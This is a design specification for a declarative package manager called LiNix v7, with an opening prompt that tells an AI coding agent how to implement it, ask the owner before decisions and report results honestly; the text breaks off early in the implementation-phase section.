# LiNix v7 — the declarative model

**Status (2026-07-17, and the tree is under active edit as this is written — trust Part VII, not
this line):** Phase 1's parser unification is closed (one `backend:name` parser, C13). Phases 2–5
largely landed (the model, the guard's nine refusals in one home, the II.12 hook ledger, F1/H2/P6);
Phase 0's deletions are still partly owed; Phase 6's containers have not been run. A five-pass code
review on 2026-07-17 added two kinds of entry under Phase 5: **R1–R23 (owner-approved fixes)** and
**SEC1–SEC7 (recorded vulnerabilities whose solutions are NOT yet decided)** — the agent is
implementing these now. The earlier "Phases 0 and 1 complete" claim was audited false; that history
lives in Part VII.

**Part VII holds the current state — read it after Part II and before you touch anything. It is the
living truth; every frozen status line, including this one, drifts behind the tree.**

Supersedes [`docs/AUDIT-v6.org`](AUDIT-v6.org) — the audit that found all of this — except
where Part VI carries an item forward explicitly. Part VI carries everything you need;
read the audit only for the underlying evidence (the measurements and the `file:line`
citations behind each finding).

---

## PROMPT — read this first, then follow it

You are implementing LiNix v7 on branch `v6` at `C:\Users\Administrator\Videos\Nexus\linix`.
This document is your specification. It was produced by a long design conversation with the
owner; **every rule in it was argued for and chosen, and Part V records why.**

**Before you write a line of code:** read Part I and Part II in full. Read Part III's "What
already exists". You cannot implement this correctly from a summary.

### Rules of engagement

1. **Part II is canonical.** If the code disagrees with Part II, the code is wrong. If Part
   II seems wrong, **stop and ask** — do not fix it yourself.
2. **Never change a Part II rule without reading its Part V entry first.** Each is the scar
   of a real bug. Most "obvious improvements" here are things we already tried and rejected;
   Part V says why. If Part V doesn't cover your case, that is a real gap — **ask.**
3. **Ask before every real decision.** The owner makes the decisions; you are responsible for
   bringing things to their attention. Explain clearly, in plain words, no jargon, as if to a
   smart new intern. **Do not use metaphors.** Give real context and a recommendation.
4. **Never remove a feature without asking**, even one this document doesn't mention. Some
   may be genuinely important. The deletion list in II.17 is already approved — anything
   beyond it is a question.
5. **Do not invent.** If the spec doesn't say, it's a gap. Ask. Do not guess and do not
   quietly pick a default — that is how this codebase got eleven magic numbers nobody can
   change (V-P5).
6. **Commit at every major step**, with a message that says what changed and what it does not
   yet do.
7. **Check everywhere. We cannot afford bugs here.** This codebase's flagship bug ran
   `apt-get purge` on hundreds of system packages during a routine test.
8. **Report honestly.** If tests fail, say so and paste the output. If you skipped a step,
   say that. If you're unsure something works, say you're unsure. Never describe unverified
   work as done.
9. **A ✅ is earned by a command, not by a belief.** Rule 8 was already here, in these words,
   and **Phases 0 and 1 were both marked ✅ while untrue anyway** — so the rule is not
   enough on its own. **Before writing ✅ on a phase, re-run that phase's Exit criterion and
   paste the result.** Before *trusting* one, re-run it. **A phase that deletes things is
   done when the greps are quiet, not when the new thing works** — Phase 0 and Phase 1 both
   failed exactly here: the replacement was built, the replaced was left standing, the tests
   went green, and green was read as done. **Green means the old code still works. That is
   the thing you were trying to remove.**
10. **At every phase change, run Part VII's audit section.** It is a list of commands, not
    prose. Delete each finding as its command goes quiet — **in the same commit as the fix**,
    because an audit nobody retires becomes the next thing nobody believes.
11. **A green suite is not success. It is the absence of one kind of failure.** The tests
    cannot see the plan. They do not know Phase 0 asked for a deletion, that II.6 asked for
    three verbs and got two, or that the grammar was supposed to *replace* the eight parsers
    rather than become the ninth. **Nothing in this document is verified by `cargo test`** —
    every ✅ that turned out false was green when it was written. So green is a floor, not a
    finding: it says you broke nothing that was already covered, which is the least
    interesting thing you could report and never the thing that was asked. **The question is
    never "do the tests pass?" It is "did I do what the plan said, in full?"** — and that is
    answered by re-reading the phase and checking yourself against it, line by line, not by
    reading a number. A partial implementation passes. A plan followed for three steps of
    five passes. The wrong design, built perfectly, passes.

### How to work

- **Follow Part III's phases in order.** Phase 0 is pure deletion and comes first
  deliberately: do not carefully port something you are about to delete.
- **Phase 2 cannot be split, and the branch is red for a long stretch.** That is expected. Do
  **not** run the old and new models side by side behind a flag — that is the exact "two ways
  to do one thing" disease this whole design cures, applied to ourselves.
- Every phase has an **exit condition**. Meet it before moving on. The exit condition is the
  bar — **not the test suite** (rule 11). Read the Exit lines and notice what they actually
  ask for: Phase 0 wants the codebase *smaller* and a line count reported; Phase 4 wants a
  test **per removal path proving the guard fires**; Phase 6 wants an **air-gapped container**
  to restore. None of those is "the suite is green", and no amount of green implies any of
  them. Phase 1's Exit is the one that reads like tests — "unit tests for every grammar rule
  above, including every error case" — and note that it names a *surface to cover*, not a
  result to observe; note also that **Phase 1 is one of the two phases that was falsely marked
  ✅.** Its tests were written and they passed. The phase still wasn't done, because covering
  the new grammar was never the same as unifying the parsers onto it.
- `cargo test` and `cargo clippy` must be green at every commit outside Phase 2's interior.
  Necessary, nowhere near sufficient: a phase can be green and untouched.
- Part IV lists the specific proofs. They are not optional.

### The three principles that decide arguments

- **Fail loud, never silent.** Every bug in this codebase is the same bug: something didn't
  work and said nothing. Given a choice between a wrong answer and a visible error, take the
  error. Always.
- **There is no legacy.** No users exist. No migration path, no compatibility shim, no
  deprecation warning, no old-format reader. Delete legacy branches on sight.
- **A comment states a constraint the code can't show. Nothing else.** Not what the line does.
  Not where it came from. Not that it's good. This repo has ~884 comments that break this
  rule, written by models congratulating themselves; do not add the next one.
  *(The figure was 139 in the first draft, measured against an older, smaller tree. Re-measured
  2026-07-16 across 2,147 comment blocks.)*

### Lessons from the 2026-07-17 review pass

A five-pass read of the actual code (messages, redundant features, surprising defaults, failure
paths, security) produced the `R*` and `SEC*` lists under **Phase 5**. The lessons behind them:

- **Stale status drifts *both* ways.** This session the HEAD header lied *downward* — it said
  "Phases 3–6 not started" while a dozen Phase 3–5 items were done with commits behind them.
  Re-run the command; never trust a status line's direction. (Reinforces rules 9–11.)
- **`R1–R23` are owner-approved fixes. `SEC1–SEC7` are recorded vulnerabilities whose solutions
  are NOT yet decided — do not implement a SEC fix until the owner rules** (the one exception is
  SEC7, a straight NO-LEGACY delete of dead code).
- **A "feature" that hand-rolls its own transaction/graph parallel to `sync` is a second engine to
  delete, not maintain.** Teleport and the `shim` command were imperative shortcuts for "edit the
  file, sync" — and teleport's private transaction *bypassed the guard* (a real safety hole). When
  you find a command doing the machine's core loop by itself, that is the bug.
- **When you surface a redundant feature, the teardown shape is yours to choose; that it goes is
  the owner's ruling.** State NO-LEGACY and that better code already exists (usually "edit the file,
  sync"); do not agonize over helper-vs-delete.
- **The security soft spot is the download/link backends.** The core is safe — every PM command is
  argv (no `sh -c`), the II.12 hook ledger is enforced on every path, archive extraction rejects
  `..`. But `web`/`appimage`/`github`/`link` take untrusted URLs and `@`-options straight to the
  filesystem: validate `@`-option paths (no `..`/separators/absolute escapes) and enforce
  TLS+checksum before making a downloaded file executable and putting it on PATH.

---

**How to use this document.**
- **Part I** — principles. Never violate these. If a decision seems to conflict with one,
  the decision is wrong, not the principle.
- **Part II** — the target state. This is what to build. It is canonical: if code disagrees
  with Part II, the code is wrong.
- **Part III** — the work, in dependency order.
- **Part IV** — how to know it's right.
- **Part V** — why. **Every decision in Part II has an entry here.** Do not change a
  Part II rule without reading its Part V entry first; each one is the scar of a real bug.
- **Part VI** — bugs: killed by this design, and carried forward as real work.

Facts marked **(measured)** were verified against real containers or real code with a
citation. Everything else is design.

---

# Part I — Principles

**P1. Every imperative command is a shortcut for editing a file and syncing.** Nothing can
be done only imperatively. If a command can make a change that no file could have made,
that command is a bug.

**P2. There is no legacy.** There are no existing users and we do not want legacy. No
migration path, no converter, no compatibility markers, no deprecation warnings, no
old-format readers. Every "legacy" branch in the codebase is dead weight for nobody. Delete
on sight.

**P3. Fail loud, never silent.** Every bug in this codebase is the same bug: something
didn't work and said nothing. When the choice is between a wrong answer and a visible
error, take the error.

**P4. A fact lives in one place.** A fact stored twice is a fact that will disagree with
itself. Compute, don't copy.

**P5. A default without a reason cannot be safely changed.** If you add a number, add the
reason. If you can't state the reason, don't add the number.

**P6. A comment states a constraint the code can't show. Nothing else.** Not what the line
does — the line does that. Not where it came from — git does that. Not that it's good —
that's the reader's call.

---

# Part II — The target state

## II.1 Files on disk

**Your repo** — `$LINIX_CONFIG_DIR` or `~/.config/linix`. **This is a git repo.**

```
modules/            your lists              lowercase names       *.txt
profiles/           your choices           Capitalized names
active              which profiles are on
priority            which backends, in order
schedules           when LiNix runs itself
locks/              what everything resolved to    one file per backend
preferences.toml    refusals and behaviour
```

**LiNix's data** — `$LINIX_DATA_DIR` or the platform data dir. **Never in git. Never in a
folder LiNix scans.**

```
registry.json       what LiNix currently owns
snapshots/          snapshot metadata, tagged with commit hashes
```

**Secrets** — the environment only. `LINIX_GITHUB_TOKEN`. Never a file.

**Facts about this machine** — **detected, never configured.** Core count, whether btrfs /
ZFS / Timeshift exists and where, which backends are installed. LiNix looks; it does not
ask you to maintain them by hand on every machine forever. **One deliberate exception:
`max_parallel` (owner ruling, 2026-07-17).** The core count is detected and is the default,
but you may set `max_parallel` by hand to cap concurrency *below* it — a preference (spare the
machine while it works), not a fact LiNix could look up. See V.41.

## II.2 Grammar

### Lines

A file is lines. A line is blank, a comment, a statement, or a block.

```
# whole-line comment                          anywhere
apt:curl                    # trailing        anywhere on a statement
```

**An unrecognised line is an error.** Not a package name. The error names the file, the
line number, and what was expected.

### Statements

```
NAME                          bare package — backend resolved via `priority`, then locked
BACKEND:NAME                  explicit backend
BACKEND:re:PATTERN            regex — matches names in that backend
absent:BACKEND:NAME           declare it must not exist
repo:BACKEND:SPEC             a repository, for that backend
shim:NAME                     a shim
schedule:NAME                 a scheduled task (only in `schedules`)
service:NAME                  a service
link:SOURCE                   a managed file
use NAME                      reference a module (lowercase) or profile (Capitalized)
```

`use` takes **a name. Never a path, never a URL.** A file from the internet is a fetch step
that puts a module on disk; then you `use` it by name like everything else.

### Options — two forms

**Short form.** `@key=value,key2=value2`.
**A comma in a value is an error**, not a guess: *"commas need the block form."*

```
apt:jq@version=1.6                    ok
apt:jq@version=>=1.0,<2.0             ERROR → "commas need the block form"
apt:curl@2.0                          ERROR → "did you mean @version=2.0?"
```

**Block form.** Everything after the first `=` to end of line is the value: **verbatim,
trimmed.** No escaping is possible and none is needed.

```
apt:nginx {
  after_install = ./setup.sh --flag=a,b
  requires      = apt:libfoo
  requires      = apt:libbar          # a key given twice makes a list
}
```

- **A value cannot contain a newline.** If you need one, that's a file, not an option.
- **`#` does not start a comment inside a block value.** The value includes it.
- A block value containing ` # ` triggers a hint: *"block values are verbatim — did you mean
  a comment? Put it on its own line."*

### Blocks

**The header decides what the body is.** `module` and `when` are keywords; their bodies are
lines. Anything else is a declaration; its body is options.

```
module fancy {          keyword → body is lines
  apt:neovim
}

when os == linux {      keyword → body is lines
  apt:htop
}

apt:nginx {             declaration → body is options
  after_install = ./setup.sh
}
```

**`when` gates the lines inside it. One rule, everywhere** — in a module those lines are
packages; in a profile they're imports; in `priority` they're backends; in `active` they're
profile names. To gate a whole file, wrap it. Keys: `os`, `arch`, `host`, `hostname`, `family`. Operators: `==`, `!=`,
`in [a, b]`.

### Option keys

| key | meaning |
|---|---|
| `version` | exact or range |
| `hold` | never upgrade. **`@hold` + `@version=` is a contradiction → error** |
| `expires` | **absolute** datetime. Present now, absent after |
| `until` | **absolute** datetime, on `absent:` only. Absent now, present after |
| `requires` | `BACKEND:NAME` — install that first. **A bare name is an error** |
| `after_install`, `before_install`, … | a hook. Hashed and locked |
| `source` | on `shim:` |
| `cron`, `run` | on `schedule:` |
| `target`, `content`, `template`, `decrypt`, `identity` | on `link:` |
| `enabled`, `status` | on `service:` |

## II.3 Modules

- A module is a **list of lines**.
- **The filename is the module name, lowercased.** `Editors.txt` → module `editors`. A file
  with no `module` block is one module named after the file. Anything outside a block
  belongs to the file's own module.
- **A module can `use` other modules. A module can NEVER reference a profile.** The layering
  rule. **A `use` loop is an error** (II.7).
- **`modules/*.txt`. The folder decides.** Anything else in `modules/` is silently ignored,
  so a `README.md` costs nothing.
- **LiNix only parses what the active profiles reach.** `linix check` parses everything on
  demand.
- **No `present:`.** A bare line already means present.
- `-` subtraction does not exist in modules. `absent:` does.

## II.4 Profiles

- Set math over modules and profiles: `|` union, `&` intersect, `\` difference, `-`
  subtract, parentheses. Directives `exclude` / `intersect`; **`use` is union** (V.46).
- **Set math produces packages, so a profile that uses it resolves to packages, not to
  modules** (V.46). It operates on lines, not on names, so **every surviving package still
  knows the file it came from** and `upgrade --module` still finds it.
- **Order is fixed: gather, then narrow by each `intersect`, then subtract. Subtraction
  always wins**, whatever order you wrote the lines in — otherwise `use gaming` below
  `-steam` quietly puts steam back.
- `intersect` narrows and never adds: a package only the other side has does not appear.
- **A profile MAY hold package lines directly.** Cost, accepted knowingly: a module can
  never reach them (layering rule), so they are unshareable, permanently.
- **Only profiles can be activated.** By name, in `active` — by hand or via `activate` /
  `activate -a` / `deactivate` (II.6).
- **A profile may reference profiles. A `use` loop is an error** (II.7).
- `absent:` does not exist in profiles. `-` does.

## II.5 Naming

- **Profiles are Capitalized. Modules are lowercase.** `(Work | gaming) & security` tells
  you what everything is with zero noise.
- `use` disambiguates a reference from a package. Case disambiguates profile from module.
- Filenames are lowercased into module names, so a filename can never mint a profile.
- **Error messages must teach the rule:** *"no profile named `Editors` — did you mean the
  module `editors`? Profiles are Capitalized, modules are lowercase."*

## II.6 The other files

**`active`** — a plain list of profile names, unioned. Answers exactly one question: *what
is this machine set to right now?* Nothing else goes in it.

**Names, never expressions.** The set math lives inside profiles (II.4). `active` is the one
file you read to know what is on, so it stays a list you can read at a glance. `when` gates
it like any other file (II.2).

```
Work
Gaming

when host == laptop {
  Travel
}
```

**Three commands write it. Nothing else does.**

| form | does |
|---|---|
| `activate NAME…` | `active` becomes exactly this list |
| `activate -a NAME…` | adds to the list |
| `deactivate NAME…` | takes away from the list |

All three **write the file and sync** — the same as editing it by hand, because the file is
the state. Each prints what it touched: `active is now Work, Gaming`.

- **`activate -a` and `deactivate` write names at the top level and never touch a `when`
  block.** A block is something you wrote; those two add to it and subtract from it by hand,
  or not at all. **`activate` is the exception, and it is the whole exception** — see the next
  bullet. *(This bullet used to say "the CLI" and applied to all three verbs, which
  contradicted the one below it. Owner decided 2026-07-17: the set form sets.)*
- **`activate NAME…` overwrites the file — blocks included.** It is the set form; it sets.
  **This is not a special case and gets no extra refusal** (V.44). It does not ask, because
  overwriting the list *is* the command's job — but **it is not silent** (S6): it names every
  block it removed. *"active is now Work, Gaming. Removed the `when host == laptop` block on
  line 4."* **Automatic and silent are different things, and only one of them is a decision
  the user gets to review after the fact.**
- **The asymmetry is the point, and it is the reason `-a` exists.** `activate` is the blunt
  verb: it makes the file say exactly what you typed, and a block is part of what the file
  says. If you want your blocks kept, you want `activate -a` or `deactivate` — the surgical
  pair. **Two verbs that both half-preserve blocks would be two ways to do one thing** (P1);
  one that replaces and two that edit is one way each.
- **`deactivate NAME` removes the name from the top level AND from every `when` block that
  applies to this host.** *"Deactivate" must mean it. A verb that removed the top-level line
  and left the name switched on by a block two lines down would be reporting a state it did
  not reach* — the same defect as `activate` "setting" a list that a block then contradicts.
  If that empties a block, **the block goes too, and it says so**: *"Removed Travel. Removed
  the now-empty `when host == laptop` block on line 4."*
- **A `when` block that does NOT apply to this host is never touched, and that is not an
  exception — it is the same rule.** On the desktop, `when host == laptop { Travel }` is not
  activating anything, so there is nothing there to deactivate. **`active` is a file you
  commit and share; reaching into another host's block from this one would change a machine
  you are not sitting at.** So it changes nothing and says why: *"Travel is not active on this
  host. `active` line 4 activates it when host == laptop — edit that by hand if you meant
  every machine."*
- **This is the one place `deactivate` edits a block and `activate -a` does not**, and the
  asymmetry is not arbitrary: **adding has a choice of where to put the name and removing does
  not.** `-a` appends at the top level because a block is a rule you wrote and it has no
  business joining it. `deactivate` has no such freedom — the name is where it is, and leaving
  it there would make the verb a lie.
- **`activate` with no names is an error:** *"activate needs a profile name. To turn
  everything off, edit `active` yourself."* An unset `$PROFILE` must not empty the machine.
- **`activate -a` on a name already listed, and `deactivate` on one that isn't, say so and
  change nothing.** Not errors — the end state is what was asked for.
- **A name that isn't a profile is an error, and it teaches II.5:** *"no profile named
  `editors` — profiles are Capitalized, modules are lowercase."*
- **`deactivate` removes packages, so it goes through the plan and the guard** like every
  other removal.

**`priority`** — an ordered list of backends, with `when` blocks.

```
when host == laptop {
  apt
  cargo
}

apt
dnf
cargo
snap
```

**Listed = available to LiNix, in this order. Not listed = LiNix does not use it at all** —
`snap:foo` errors with *"snap isn't in your priority list."*

**`schedules`** — lines, with `when` blocks. **Being in the file means it's on.** No
active-list.

```
schedule:nightly {
  cron = 0 3 * * *
  run  = sync
}
```

`run=` is hashed and locked exactly like a hook.

**`locks/`** — one file per backend. **Generated. In git. Yours.** Records:

| | |
|---|---|
| version | `apt:curl → 7.81.0` |
| **resolved backend for a bare name** | `ripgrep → cargo:ripgrep@14.1.0` |
| **regex expansion** (only if frozen) | `re:^texlive- → [312 names]` |
| **hook script hash** | `fonts:after_install → sha256:a3f1…` |

`linix lock` regenerates. `linix lock <name>` regenerates one. `linix lock --backend cargo`
regenerates one file.

**`preferences.toml`** — refusals and behaviour. **Nothing writes to it but you.**

## II.7 Resolution

1. Read `active` → the profile names, unioned.
2. Resolve profiles → the module set. Profiles may reference profiles; modules may not.
3. Parse **only** the modules reached. Apply `when`.
4. Resolve each line. Bare names use `priority`, then the lock.
5. **Two active declarations that contradict = ERROR.** Stop, show both, name both files.
   Not first-wins, not file order.
6. **Dated lines:**
   - **A dated line stops counting once its date passes.**
   - **While it is counting, a dated line beats an undated one.** *(The only exception to
     rule 5.)*
7. Produce the desired state.

### Cycles

**A `use` cycle is an error, at both layers.** `Work` uses `Gaming` uses `Work`. Module `a`
uses `b` uses `a`. **Self-reference is the one-element case** and is the same error.

**`@requires` cycles are the same error** — `apt:a@requires=apt:b` and
`apt:b@requires=apt:a`. Same graph, same walk, same answer: the planner orders by the native
dependency graph plus `@requires` edges, and a loop has no order. **It owes the same error as
a `use` loop**: which packages, and the file and line each edge came from.

**The error names every file and line in the loop, in order, and stops.** It does not dedupe
and carry on (V.45):

```
ERROR: profiles reference each other in a loop

  profiles/Work.txt:3     use Gaming
  profiles/Gaming.txt:7   use Servers
  profiles/Servers.txt:2  use Work
                          ^ back to Work
```

**A diamond is not a cycle.** `Work` and `Gaming` may both `use base`. Reaching a module
twice by two routes is not an error — sharing a module is what modules are for (V.2). Only a
path that **returns to where it started** is a loop. *(So the check is a path, not a set of
everything ever visited.)*

**`linix check` catches cycles no active profile reaches** — consistent with II.3: LiNix
parses what the active profiles reach, `check` parses everything on demand.

**Ordering is the planner's job, never the file layout's.** Repos first → refresh indexes →
packages (native dependency graph + `@requires` edges) → things depending on packages
(services, shims, links).

**What LiNix may remove: what it manages and you stopped declaring. Plus `absent:`. Nothing
else, ever.**

## II.8 Commands

| command | does |
|---|---|
| `install PKG… [--into NAME]` | write the line, sync |
| `uninstall PKG… [--temp]` | remove the line from every active module, sync |
| `forget PKG…` | drop from the registry. Stays installed. LiNix never touches it again |
| `adopt [PKG]` | take over the machine, or one package |
| `sync` | make the machine match |
| `plan` | show what sync would do |
| `check` | parse everything, report errors |
| `lock [NAME]` | freeze versions / expansions, approve hooks |
| `purge-unmanaged` | delete everything LiNix doesn't manage |
| `clean` | ask each backend to tidy its own orphans |
| `unmanaged` | what `adopt` would adopt |
| `absent` | every `absent:` line in force, and its module |
| `diff COMMIT COMMIT` | the change in **packages**, not text |
| `teleport PKG BACKEND` | edit the line, sync |
| `shell` | throwaway shell. Outside the model |
| `bundle` | git bundle + artifacts + registry |
| `export FORMAT` | Brewfile / requirements.txt / package.json |
| `activate NAME… [-a]` | write `active` — the list, or `-a` to add to it (II.6), sync |
| `deactivate NAME…` | take away from `active` (II.6), sync |
| `upgrade`, `list`, `status`, `doctor`, `profile`, `service`, `repo`, `hold` | as today, all reduced to file edits |

**`shell` must be honest about being outside the model:** it writes no module, and **stops
recording transient packages in the registry** — which is what lets a session's leftovers
look like managed drift later.

**Destroying a file you wrote** (e.g. `module create` over an existing file) is a **plain
refusal plus `--force`**, like every other tool. It has nothing to do with packages and must
not be wired to a setting about removals.

**Every command prints the file it touched:**
`Added jq to modules/imperative.txt (used by profile Work)`

**`--into` takes a module (lowercase) or a profile (Capitalized).**

**Three landing modules, named for how the package arrived:**

| module | arrived via |
|---|---|
| `imperative` | `linix install` |
| `hooks` | `apt install`, caught by the hook |
| `adopted` | `linix adopt` |

The first time LiNix writes to one, it adds `use <name>` to the active profile and **says
so**. A normal line you can read and delete. **Never implicit.**

**`uninstall` warns about inactive declarations:** *"jq is still declared in module
`gaming`, which isn't active. It will come back if you activate Gaming."*

**`uninstall PKG --temp` on an undeclared package is an error:** *"steam isn't declared, so
there's nothing for it to come back to. Did you mean a plain uninstall?"*

**`--backend` is allowed on read-only and upgrade; REFUSED on anything that removes.**
`plan`, `list`, `upgrade` → yes. `sync`, `purge-unmanaged` → error: *"scoping a removal
isn't safe; use a profile."*

**`clean` goes through the guard** — ask the backend what it intends, check the list against
protection, refuse if it touches something protected. **Sync nudges:** *"3 packages are now
orphaned; run `linix clean`."* Want it automatic? `schedule:tidy { run = clean }`.

## II.9 Adopt

**Adopt takes manually-installed packages only. Never the dependency closure.**

**(measured)**

| Backend | Record | Result |
|---|---|---|
| apt | `apt-mark showmanual` | 103 of 579 |
| pacman | `-Qqe` | 11 of 173 |
| conda | `env export --from-history` | 4 of 88 |
| winget / choco / scoop | installs no dependencies — everything **is** chosen | exact |
| **pip** | **none.** No flag separates dependencies | **adopt nothing, say why** |

**Base-image packages ARE adopted** — `grub-pc`, `linux-image-generic`. They keep the
machine bootable, and `purge-unmanaged` deletes what isn't declared.

**Output:** one `modules/adopted.txt`, grouped by backend with comment headers, sorted.
Header states: this is an estimate; deleting a line uninstalls; `linix forget` is the way
out. A second section lists OS-essential packages, commented out.

**Adopt does NOT consult `protected_packages`.** This resolves **E7**, where "protected"
means two opposite things: *never remove* in the guard, *never adopt* in `migrate.rs`.
**Protection means one thing: never remove.** So adopt takes every manual package including
protected ones; protection then prevents their removal. This is a **change from what Stage 2
built** — Stage 2 routed adopt's skipping through `guard::protection_of`, which unified the
code while keeping the word ambiguous. Adopting a protected package is correct: it belongs
in your file, and deleting that line is refused (V.26).

## II.10 The guard — nine refusals, one function

| | |
|---|---|
| `protected_packages` | never remove this |
| `unprotected_packages` | …unless I say so. **Wins over everything, including OS-essential** |
| OS-essential | never remove what the OS says is load-bearing |
| `max_removals` (default **20**) | never remove more than this at once |
| `max_installs` (default **unset**) | never install more than this at once |
| `deny_packages` | never install this |
| `pinned_only` (default **off**) | never install anything without an explicit `@version=` |
| `require_snapshot` (default **off**) | never change anything when no snapshot can be taken |
| `deny_vulnerable` (default **off**) | never apply when `audit` reports a managed package vulnerable |

All in `[guard]` in `preferences.toml`. One decision function. **Every removal path calls
it** — sync, `absent:`, expiry, `purge-unmanaged`, `clean`, shell exit, `uninstall`. The
last three also gate *installs* and *changes*, so the install paths call it too.

**A confirmation asks; a refusal says no.**

| | `-y` |
|---|---|
| sync shows the plan and asks | **skips** |
| `max_removals` exceeded | **cannot skip.** `--allow-mass-removal` |
| `max_installs` exceeded | **cannot skip.** `--allow-mass-install` |
| hook script new or changed | **cannot skip.** `linix lock` |
| protected / OS-essential | **nothing overrides** |
| `purge-unmanaged` | **cannot skip.** Typed confirmation |
| `pinned_only` / `require_snapshot` / `deny_vulnerable` | **cannot skip.** They are refusals (V.43) |

**The plan always leads with the counts** — not a threshold, not a warning, just the plan
being readable:

```
Plan: install 30,207 · remove 0 · upgrade 3
  30,102  re:^lib
      98  apt
       7  cargo
```

## II.11 `purge-unmanaged`

- **The guard is a RATIO, not a count:**
  ```
  LiNix manages 3 packages.
  This will remove 576, including python3, libc6, and bash.
  That looks like you haven't adopted this machine yet.
  Run `linix adopt` first, or --i-really-mean-it if you're sure.
  ```
- `max_removals` does **not** apply (it catches accidents; this is deliberate).
  `protected_packages` and OS-essential **always** apply.
- **Snapshots first**, automatically. **If none is available, say so loudly** — *"there is no
  undo for this"* is the most important sentence this command can print.
- **Shows the whole list.** 576 packages is 576 lines. The pain is the feature.
- Docs state the residual risk in these words: adopt is an estimate; if it missed something,
  this deletes it.

## II.12 Hooks and the supply chain

**The lock is the approval.** `locks/` records each hook script's hash. Hash mismatch →
**stop**:

```
module `fonts` (from github:x/y) changed its after_install script since you approved it.
  was: sha256:a3f1…   now: sha256:9c2e…
Run `linix lock fonts` to see the new script and approve it.
```

**Hash everything, including your own scripts.** One rule, no exceptions.

**Two kinds of hook, by when they run — both go through the ledger.** Whole-sync lifecycle
hooks live in the `[hooks]` config block (`before_sync`/`after_sync`, target `*`, run once
around the entire sync). Per-package hooks are attached to a declaration
(`apt:nginx { after_install = ./setup.sh }`) and fire inside the engine for that one package,
keyed per package (`after_install:nginx` ≠ `after_install:redis`). These are **not duplicates**
— a per-package hook cannot express "before the whole sync", so `[hooks]` stays (owner ruling
2026-07-17; that is why it is not on II.17's delete list).

**`plan` shows the trust, before anything happens:**

```
module `fonts` (github:x/y)
  adds repository  ppa:fonts/testing
  runs script      after_install: ./setup.sh   [approved]
module `dev` (local)
  runs script      after_install: ./build.sh   [CHANGED — needs approval]
```

## II.13 History

**Git is your intent. Snapshots are your machine.** Two jobs, two mechanisms, neither
pretending to be the other.

**A generation IS a git commit. LiNix commits only on a successful sync** — so every commit
in your history is a state your machine **actually reached**.

- `git log` = where your machine has been.
- **`git diff` and `linix plan` are the same question.**
- Rollback can never take you somewhere that never worked.

**Order: snapshot → apply → commit.** On failure, restore the snapshot and don't commit —
files and machine agree, because the snapshot brought `registry.json` back with it.
**Tag the snapshot with the commit hash.**

**Rollback = `git checkout` + `sync`.** The registry is always current; its history is not
stored, because declaration + convergence reproduces it. **There is no generation format.**

**Snapshots are a preference**, default on if the machine can do it (btrfs, ZFS, or
Timeshift). Retention prunes — **one engine** (`retention`), not two.

**No commit algebra.** Git covers what's real:

| you want | git |
|---|---|
| union of commits | `merge` |
| take that one change | `cherry-pick` — "roll back but keep the jq I added" |
| undo that one thing, keep the rest | `revert` |
| chained and nested | branches |
| **intersect of commits** | **nothing. No such operation, no use case found** |

**Integrity is `git commit -S`.** LiNix checks that git says the commit is signed, and by
whom. **`locksig.rs`, `.linix-lock.key`, and the fail-open branch are deleted.**

## II.14 Version pins — precedence

1. **`@version=` in a module** — you wrote it. **It wins.**
2. **`locks/`** — generated; fills in everything you didn't pin.
3. **Nothing** — whatever's current.

A hand-written pin disagreeing with the lock is **not an error** (today it fails the run).
You wrote it, it wins, LiNix regenerates the lock to agree and says so.

## II.15 Regex

**`re:` prefix. Live by default, lockable when you want it frozen.**

**The lock file IS the switch.** Entry in `locks/` → frozen. No entry → live, re-evaluated
every sync. `linix lock texlive` freezes one; delete the entry and it's live again.

**`plan` shows which is which:**
```
re:^fonts-      live    1,043 packages today
re:^texlive-    frozen  312 packages
```

**(measured)** `apt:re:^python3-.*` → 4,447. `apt:re:^lib` → 30,207.

**Residual hole, accepted:** `texlive-foo` renamed to `tex-foo` silently drops one package.
One package, recoverable, snapshot has your back.

## II.16 Everything is a line

| Today | Becomes |
|---|---|
| `linix repo add` (**stores nothing**) | `repo:apt:ppa:deadsnakes/ppa` |
| `linix shim jq --source cargo:jq` (**`--source` discarded unread**) | `shim:jq@source=cargo:jq` |
| `linix hold jq` (machine-local `registry.json`) | `apt:jq@hold` |
| hooks table in config | `apt:nginx@after_install=./setup.sh` |
| `linix schedule add` (**writes config**) | a line in `schedules` |
| `@lease=2h` (**inert today**) | `apt:jq@expires=2026-07-17T14:00` |
| `remove --temp` (**loses to sync**) | `absent:apt:jq@until=…` |
| `bloatware.txt` | `absent:apt:libreoffice` in a module |

A repo and the package needing it are **one fact**:
```
module python-latest {
  repo:apt:ppa:deadsnakes/ppa
  apt:python3.12
}
```

**Expired lines linger.** LiNix must not rewrite your files. It mentions them, **naming the
exact file and line** — never vaguely. Only the dated line is dead; the undated one is doing
real work and must stay.

## II.17 Deleted

**Commands:** `prune` · `orphans` · `clone` · `migrate` (→ `adopt`) · `remove` (→
`uninstall`)

**Flags:** `-g` / `--groups-dir` · `--no-global` · `--allow-regex-expansion` ·
`--backend` on removing commands

**Syntax:** `group:` · `include:` · `host-*.txt` · `_active_profiles.txt` · `local.txt`'s
special status · `-vim` in modules

**Config:** `[groups]` · `[hostname_packages]` · `[managed_files]` ·
`[schedules]` · `backend_priority` · `enabled_backends` · `hostname_backends` ·
`default_backend` · `prune_on_sync` · `prune_scope` · `purge_orphans` · `cache_ttl` ·
`confirm_destructive` · `protect_imperative` · `remove_bloatware` · `timeshift_path` ·
`config.snapshots` · `github_token` (→ env)
*(`max_parallel` was struck from this delete list by owner ruling 2026-07-17 — it stays as an
optional concurrency cap. See II.1 and V.41.)*

**Files:** `keep.txt` (→ `forget`) · `policy.toml` (→ `[guard]`) · `bloatware.txt` (→
`absent:`) · `.linix-lock.key` · `locks.json` (→ `locks/`) · `ghosts.json`

*(`[hooks]` was struck from the config delete list by owner ruling 2026-07-17. It is **not** a
duplicate of module hooks — the two are different features by *when they run*: `[hooks]` holds
whole-sync lifecycle hooks (`before_sync`/`after_sync`, target `*`), while `before_install`/
`after_install` are per-package hooks attached to a declaration. Deleting `[hooks]` would remove
the whole-sync kind, which modules cannot express. See II.12.)*

**Code:** `locksig.rs` · the generation format · `ManifestArchive` · `quick()` ·
`ScopedFilter::None` as a spare-everything switch · every legacy branch

---

# Part III — The work

## What already exists on branch `v6`

Four stages of the old plan are committed. **Read this before deleting anything.**

| | commit | fate |
|---|---|---|
| **Stage 1** — the guard, backend manual-listing labels, apt `showmanual`, conda `--from-history`, essential parsing, `unmanage` | `47f82b6` | **Keep.** Becomes Phase 3's foundation. The `ManualListing` taxonomy and `guard::protection_of` are the right shape. |
